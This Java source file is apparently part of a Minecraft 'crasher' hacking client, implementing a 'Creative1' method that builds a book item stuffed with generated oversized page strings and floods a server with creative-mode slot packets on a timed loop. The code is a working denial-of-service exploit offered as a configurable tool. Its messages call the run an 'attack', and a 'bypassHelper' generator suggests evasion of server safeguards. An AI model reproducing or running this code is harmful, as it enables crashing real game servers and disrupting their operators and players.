package us.whitedev.crashers.impl;

import java.util.List;
import java.util.Locale;
import java.util.Optional;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundSetCreativeModeSlotPacket;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class Creative1 implements Crasher {
    private static final String METHOD_NAME = "Creative1";
    private boolean enabled = false;
    private ScheduledExecutorService executorService;

    public Creative1() {
    }

    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int chars = Integer.parseInt(args[3]);
        int pages = Integer.parseInt(args[4]);
        String genType = args[5].toLowerCase(Locale.ROOT);
        String bookType = args[6].toLowerCase(Locale.ROOT);
        long threadSleep = Long.parseLong(args[7]);
        int loopAmount = Integer.parseInt(args[8]);
        this.setEnabled(true);
        if (this.executorService != null && !this.executorService.isShutdown()) {
            this.executorService.shutdownNow();
            msgHelper.sendMessage("Previous attack &cstopped&7!", true);
        }

        msgHelper.sendMessage("Starting crashing with &f" + this.getName(), true);
        StringBuilder s = new StringBuilder();
        s.append(bypassHelper.generateString(chars, genType));
        CompoundTag comp = new CompoundTag();
        ListTag list = new ListTag();

        for(int i = 0; i < pages; ++i) {
            list.add(new StringTag(s.toString()));
        }

        comp.putString("author", "0whitedev");
        comp.putString("title", "madeq");
        comp.putByte("resolved", (byte)1);
        comp.put("pages", list);
        ItemStack itemstack = new ItemStack(bookType.equals("normal") ? Items.WRITABLE_BOOK : Items.WRITTEN_BOOK, 1, Optional.of(comp));
        AtomicInteger check = new AtomicInteger(0);
        this.executorService = Executors.newSingleThreadScheduledExecutor();
        Runnable clickTask = () -> {
            for(int i = 0; i < packets; ++i) {
                if (!this.enabled || check.get() == loopAmount) {
                    this.executorService.shutdown();
                    this.setEnabled(false);
                    msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
                    break;
                }

                PacketHelper.send(new ServerboundSetCreativeModeSlotPacket(20, itemstack));
            }

            check.getAndIncrement();
        };
        this.executorService.scheduleAtFixedRate(clickTask, 0L, threadSleep, TimeUnit.MILLISECONDS);
    }

    public String getName() {
        return "Creative1";
    }

    public boolean getEnabled() {
        return this.enabled;
    }

    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    public String getArgsUsage() {
        return "packets[100], chars[100], pages[10], generator[modern], item[saved], thread-sleep[1500(milliseconds)], loop-amount[10]";
    }

    public List<OptionUtil> getOptions() {
        return List.of(new OptionUtil("Packets", OptionType.INTEGER), new OptionUtil("Chars", OptionType.INTEGER), new OptionUtil("Pages", OptionType.INTEGER), new OptionUtil("Generator", OptionType.LIST, new String[]{"Default", "Boost1", "Boost2", "Modern1", "Modern2", "Hard"}), new OptionUtil("Item", OptionType.LIST, new String[]{"Normal", "Saved"}), new OptionUtil("Thread Sleep", OptionType.INTEGER), new OptionUtil("Loop Amount", OptionType.INTEGER));
    }

    public String getDescription() {
        return "CreativeSlot Crasher [book]";
    }
}
